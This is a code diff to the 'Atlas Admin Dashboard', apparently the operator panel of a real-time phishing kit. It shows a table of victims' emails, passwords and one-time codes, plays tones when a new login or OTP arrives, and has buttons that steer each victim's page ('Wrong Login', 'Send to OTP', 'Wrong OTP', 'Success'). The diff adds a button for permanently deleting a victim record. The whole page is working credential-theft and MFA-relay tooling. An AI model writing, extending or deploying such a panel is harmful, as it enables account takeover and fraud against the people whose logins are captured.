@@ -6,49 +6,22 @@
 <title>Atlas Admin Dashboard</title>
 <style>
 :root {
-  --bg: #f3f4f6;
-  --card: #ffffff;
-  --text: #1f2937;
-  --text-secondary: #6b7280;
-  --border: #e5e7eb;
-  --hover: #fafafa;
-  --table-header: #f9fafb;
-  --input-bg: #ffffff;
+  --bg: #f3f4f6; --card: #ffffff; --text: #1f2937; --text-secondary: #6b7280;
+  --border: #e5e7eb; --hover: #fafafa; --table-header: #f9fafb; --input-bg: #ffffff;
 }
 [data-theme="dark"] {
-  --bg: #0f172a;
-  --card: #1e293b;
-  --text: #f1f5f9;
-  --text-secondary: #94a3b8;
-  --border: #334155;
-  --hover: #334155;
-  --table-header: #0f172a;
-  --input-bg: #334155;
+  --bg: #0f172a; --card: #1e293b; --text: #f1f5f9; --text-secondary: #94a3b8;
+  --border: #334155; --hover: #334155; --table-header: #0f172a; --input-bg: #334155;
 }
 * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }
 body { background: var(--bg); min-height: 100vh; color: var(--text); transition: background 0.2s, color 0.2s; }
-.navbar {
-  background: var(--card); padding: 16px 24px;
-  display: flex; justify-content: space-between; align-items: center;
-  box-shadow: 0 1px 3px rgba(0,0,0,0.08); flex-wrap: wrap; gap: 12px;
-}
+.navbar { background: var(--card); padding: 16px 24px; display: flex; justify-content: space-between; align-items: center; box-shadow: 0 1px 3px rgba(0,0,0,0.08); flex-wrap: wrap; gap: 12px; }
 .navbar h1 { font-size: 20px; color: var(--text); font-weight: 700; }
 .navbar-right { display: flex; gap: 10px; align-items: center; flex-wrap: wrap; }
-.toggle-btn {
-  padding: 8px 14px; border-radius: 50px; border: 1px solid var(--border);
-  background: var(--card); color: var(--text); cursor: pointer;
-  font-size: 13px; font-weight: 600;
-}
-.sound-btn {
-  padding: 8px 16px; border-radius: 50px; border: none;
-  cursor: pointer; font-weight: 600; font-size: 13px;
-  background: #10b981; color: white;
-}
+.toggle-btn { padding: 8px 14px; border-radius: 50px; border: 1px solid var(--border); background: var(--card); color: var(--text); cursor: pointer; font-size: 13px; font-weight: 600; }
+.sound-btn { padding: 8px 16px; border-radius: 50px; border: none; cursor: pointer; font-weight: 600; font-size: 13px; background: #10b981; color: white; }
 .sound-btn.off { background: #ef4444; }
-.logout-btn {
-  padding: 8px 16px; border-radius: 50px; border: none;
-  background: #ef4444; color: white; cursor: pointer; font-weight: 600; font-size: 13px;
-}
+.logout-btn { padding: 8px 16px; border-radius: 50px; border: none; background: #ef4444; color: white; cursor: pointer; font-weight: 600; font-size: 13px; }
 .container { max-width: 1400px; margin: 24px auto; padding: 0 20px; }
 .stats { display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 16px; margin-bottom: 24px; }
 .stat-card { background: var(--card); border-radius: 16px; padding: 20px; box-shadow: 0 1px 3px rgba(0,0,0,0.08); }
@@ -56,11 +29,7 @@ body { background: var(--bg); min-height: 100vh; color: var(--text); transition:
 .stat-card .num { font-size: 28px; font-weight: 700; color: var(--text); }
 .table-wrap { background: var(--card); border-radius: 20px; overflow-x: auto; box-shadow: 0 1px 3px rgba(0,0,0,0.08); }
 table { width: 100%; border-collapse: collapse; min-width: 1400px; }
-th {
-  text-align: left; padding: 14px 16px; background: var(--table-header);
-  font-size: 12px; color: var(--text-secondary); font-weight: 600;
-  border-bottom: 1px solid var(--border); text-transform: uppercase;
-}
+th { text-align: left; padding: 14px 16px; background: var(--table-header); font-size: 12px; color: var(--text-secondary); font-weight: 600; border-bottom: 1px solid var(--border); text-transform: uppercase; }
 td { padding: 14px 16px; border-bottom: 1px solid var(--border); font-size: 13px; color: var(--text); vertical-align: middle; }
 tr:hover { background: var(--hover); }
 .badge { display: inline-block; padding: 4px 10px; border-radius: 20px; font-size: 11px; font-weight: 600; }
@@ -68,11 +37,8 @@ tr:hover { background: var(--hover); }
 .badge-approved { background: #d1fae5; color: #059669; }
 .badge-otp { background: #e0e7ff; color: #4f46e5; }
 .badge-success { background: #d1fae5; color: #059669; }
-.actions { display: flex; flex-wrap: wrap; gap: 6px; max-width: 500px; }
-.btn {
-  padding: 6px 10px; border-radius: 8px; border: none;
-  cursor: pointer; font-size: 11px; font-weight: 600; white-space: nowrap;
-}
+.actions { display: flex; flex-wrap: wrap; gap: 6px; max-width: 550px; }
+.btn { padding: 6px 10px; border-radius: 8px; border: none; cursor: pointer; font-size: 11px; font-weight: 600; white-space: nowrap; }
 .btn:hover { opacity: 0.85; }
 .btn-wrong { background: #dc2626; color: white; }
 .btn-yes { background: #10b981; color: white; }
@@ -81,35 +47,22 @@ tr:hover { background: var(--hover); }
 .btn-otp { background: #4f46e5; color: white; }
 .btn-success { background: #059669; color: white; }
 .btn-wrong-otp { background: #e11d48; color: white; }
+.btn-delete { background: #991b1b; color: white; border: 1px solid #7f1d1d; }
+.btn-delete:hover { background: #7f1d1d; }
 .btn-copy { background: var(--border); color: var(--text); padding: 4px 8px; font-size: 10px; border-radius: 6px; border: none; cursor: pointer; margin-left: 6px; }
 
-#toast {
-  position: fixed; top: 80px; left: 50%; transform: translateX(-50%);
-  padding: 14px 24px; border-radius: 12px; color: white;
-  font-weight: 600; font-size: 14px; z-index: 20000;
-  display: none; box-shadow: 0 10px 40px rgba(0,0,0,0.3);
-}
+#toast { position: fixed; top: 80px; left: 50%; transform: translateX(-50%); padding: 14px 24px; border-radius: 12px; color: white; font-weight: 600; font-size: 14px; z-index: 20000; display: none; box-shadow: 0 10px 40px rgba(0,0,0,0.3); }
 #toast.success { background: #10b981; }
 #toast.error { background: #ef4444; }
 
-.modal-overlay {
-  position: fixed; inset: 0; background: rgba(0,0,0,0.6);
-  z-index: 10000; display: none; justify-content: center; align-items: center; padding: 20px;
-}
+.modal-overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.6); z-index: 10000; display: none; justify-content: center; align-items: center; padding: 20px; }
 .modal-overlay.active { display: flex; }
 .modal { background: var(--card); border-radius: 20px; padding: 32px; max-width: 400px; width: 100%; }
 .modal h3 { color: var(--text); margin-bottom: 16px; font-size: 18px; }
-.modal input, .modal textarea {
-  width: 100%; padding: 12px; border: 1.5px solid var(--border);
-  border-radius: 10px; font-size: 15px; margin-bottom: 16px; outline: none;
-  font-family: inherit; background: var(--input-bg); color: var(--text);
-}
+.modal input, .modal textarea { width: 100%; padding: 12px; border: 1.5px solid var(--border); border-radius: 10px; font-size: 15px; margin-bottom: 16px; outline: none; font-family: inherit; background: var(--input-bg); color: var(--text); }
 .modal textarea { min-height: 100px; resize: vertical; }
 .modal-buttons { display: flex; gap: 10px; }
-.modal-buttons button {
-  flex: 1; padding: 12px; border-radius: 10px; border: none;
-  font-weight: 600; cursor: pointer; font-size: 14px;
-}
+.modal-buttons button { flex: 1; padding: 12px; border-radius: 10px; border: none; font-weight: 600; cursor: pointer; font-size: 14px; }
 .modal-buttons .confirm { background: #4a4ff0; color: white; }
 .modal-buttons .cancel { background: var(--border); color: var(--text); }
 </style>
@@ -139,12 +92,7 @@ tr:hover { background: var(--hover); }
     <table>
       <thead>
         <tr>
-          <th>ID</th>
-          <th>Email</th>
-          <th>Password</th>
-          <th>OTP</th>
-          <th>Status</th>
-          <th>Actions</th>
+          <th>ID</th><th>Email</th><th>Password</th><th>OTP</th><th>Status</th><th>Actions</th>
         </tr>
       </thead>
       <tbody id="usersTable"></tbody>
@@ -199,7 +147,7 @@ themeBtn.addEventListener('click', () => {
   themeBtn.textContent = next === 'dark' ? '☀️ Light' : '🌙 Dark';
 });
 
-// LOUD TONES
+// TONES
 function getAudioCtx() {
   if (!audioCtx) audioCtx = new (window.AudioContext || window.webkitAudioContext)();
   if (audioCtx.state === 'suspended') audioCtx.resume();
@@ -222,7 +170,7 @@ function playTone(freqs, durs, vol = 0.9) {
       o.start(t); o.stop(t + durs[i]);
       t += durs[i];
     });
-  } catch(e) { console.log(e); }
+  } catch(e) {}
 }
 function playEmailTone() {
   playTone([1200, 1500, 1200, 1500], [0.12, 0.12, 0.12, 0.12], 0.9);
@@ -240,7 +188,6 @@ document.getElementById('soundBtn').addEventListener('click', () => {
   else { b.classList.add('off'); b.textContent = '🔇 Sound Off'; }
 });
 
-// TOAST
 function showToast(msg, type = 'success') {
   const t = document.getElementById('toast');
   t.textContent = msg;
@@ -250,7 +197,6 @@ function showToast(msg, type = 'success') {
   window.toastT = setTimeout(() => { t.style.display = 'none'; }, 3000);
 }
 
-// LOAD USERS
 async function loadUsers() {
   try {
     const res = await fetch('/api/admin/users', { headers: { 'Authorization': `Bearer ${token}` } });
@@ -271,7 +217,6 @@ function updateStats() {
   document.getElementById('statSuccess').textContent = users.filter(u => u.status === 'success').length;
 }
 
-// ============ ALL 7 BUTTONS ALWAYS VISIBLE ============
 function renderTable() {
   const tbody = document.getElementById('usersTable');
   if (!users.length) {
@@ -286,7 +231,6 @@ function renderTable() {
     else if (u.status === 'otp_submitted') badge = '<span class="badge badge-otp">OTP Submitted</span>';
     else if (u.status === 'success') badge = '<span class="badge badge-success">Success</span>';
 
-    // ⭐ ALL BUTTONS ALWAYS VISIBLE — no status filtering
     const allButtons = `
       <button class="btn btn-wrong" onclick="wrongLogin('${u.email}')">Wrong Login</button>
       <button class="btn btn-yes" onclick="openYes('${u.email}')">Yes</button>
@@ -295,6 +239,7 @@ function renderTable() {
       <button class="btn btn-otp" onclick="sendToOtp('${u.email}')">Send to OTP</button>
       <button class="btn btn-wrong-otp" onclick="wrongOtp('${u.email}')">Wrong OTP</button>
       <button class="btn btn-success" onclick="markSuccess('${u.email}')">Success</button>
+      <button class="btn btn-delete" onclick="deleteUser('${u.email}')">🗑 Delete</button>
     `;
 
     return `<tr>
@@ -317,7 +262,6 @@ function copyText(text, label) {
   showToast(`✅ ${label} copied`, 'success');
 }
 
-// ACTIONS
 async function post(path, body) {
   const res = await fetch(path, {
     method: 'POST',
@@ -328,43 +272,52 @@ async function post(path, body) {
 }
 
 async function wrongLogin(email) {
-  try {
-    const r = await post('/api/admin/wrong-login', { email });
-    showToast(r.success ? '✅ Wrong Login sent' : '❌ Failed', r.success ? 'success' : 'error');
-    loadUsers();
-  } catch (e) { showToast('❌ Network error', 'error'); }
+  try { const r = await post('/api/admin/wrong-login', { email }); showToast(r.success ? '✅ Wrong Login sent' : '❌ Failed', r.success ? 'success' : 'error'); loadUsers(); }
+  catch (e) { showToast('❌ Network error', 'error'); }
 }
-
 async function timeoutUser(email) {
-  try {
-    const r = await post('/api/admin/timeout', { email });
-    showToast(r.success ? '✅ Timeout sent' : '❌ Failed', r.success ? 'success' : 'error');
-    loadUsers();
-  } catch (e) { showToast('❌ Network error', 'error'); }
+  try { const r = await post('/api/admin/timeout', { email }); showToast(r.success ? '✅ Timeout sent' : '❌ Failed', r.success ? 'success' : 'error'); loadUsers(); }
+  catch (e) { showToast('❌ Network error', 'error'); }
 }
-
 async function sendToOtp(email) {
-  try {
-    const r = await post('/api/admin/send-to-otp', { email });
-    showToast(r.success ? '✅ User redirected to OTP' : '❌ Failed', r.success ? 'success' : 'error');
-    loadUsers();
-  } catch (e) { showToast('❌ Network error', 'error'); }
+  try { const r = await post('/api/admin/send-to-otp', { email }); showToast(r.success ? '✅ User redirected to OTP' : '❌ Failed', r.success ? 'success' : 'error'); loadUsers(); }
+  catch (e) { showToast('❌ Network error', 'error'); }
 }
-
 async function wrongOtp(email) {
-  try {
-    const r = await post('/api/admin/wrong-otp', { email });
-    showToast(r.success ? '✅ Wrong OTP signal sent' : '❌ Failed', r.success ? 'success' : 'error');
-    loadUsers();
-  } catch (e) { showToast('❌ Network error', 'error'); }
+  try { const r = await post('/api/admin/wrong-otp', { email }); showToast(r.success ? '✅ Wrong OTP signal sent' : '❌ Failed', r.success ? 'success' : 'error'); loadUsers(); }
+  catch (e) { showToast('❌ Network error', 'error'); }
+}
+async function markSuccess(email) {
+  try { const r = await post('/api/admin/success', { email }); showToast(r.success ? '✅ Success triggered' : '❌ Failed', r.success ? 'success' : 'error'); loadUsers(); }
+  catch (e) { showToast('❌ Network error', 'error'); }
 }
 
-async function markSuccess(email) {
+async function deleteUser(email) {
+  const confirmed = confirm(
+    `⚠️ DELETE USER PERMANENTLY?\n\n` +
+    `Email: ${email}\n\n` +
+    `This will remove the user completely from the database.\n` +
+    `This action CANNOT be undone.`
+  );
+  if (!confirmed) return;
+
   try {
-    const r = await post('/api/admin/success', { email });
-    showToast(r.success ? '✅ Success triggered' : '❌ Failed', r.success ? 'success' : 'error');
-    loadUsers();
-  } catch (e) { showToast('❌ Network error', 'error'); }
+    const res = await fetch('/api/admin/delete-user', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${token}` },
+      body: JSON.stringify({ email })
+    });
+    const data = await res.json();
+
+    if (data.success) {
+      showToast(`✅ User ${email} deleted permanently`, 'success');
+      loadUsers();
+    } else {
+      showToast(`❌ Failed: ${data.error || 'Unknown error'}`, 'error');
+    }
+  } catch (e) {
+    showToast('❌ Network error', 'error');
+  }
 }
 
 function openYes(email) {
@@ -404,10 +357,10 @@ async function confirmText() {
 function closeModal(id) { document.getElementById(id).classList.remove('active'); }
 function logout() { localStorage.removeItem('adminToken'); window.location.href = '/admin'; }
 
-// SOCKET EVENTS — LOUD TONES
 socket.on('user-login', () => { playEmailTone(); loadUsers(); });
 socket.on('user-otp', () => { playOtpTone(); loadUsers(); });
 socket.on('user-updated', () => loadUsers());
+socket.on('user-deleted', () => loadUsers());
 
 loadUsers();
 setInterval(loadUsers, 5000);
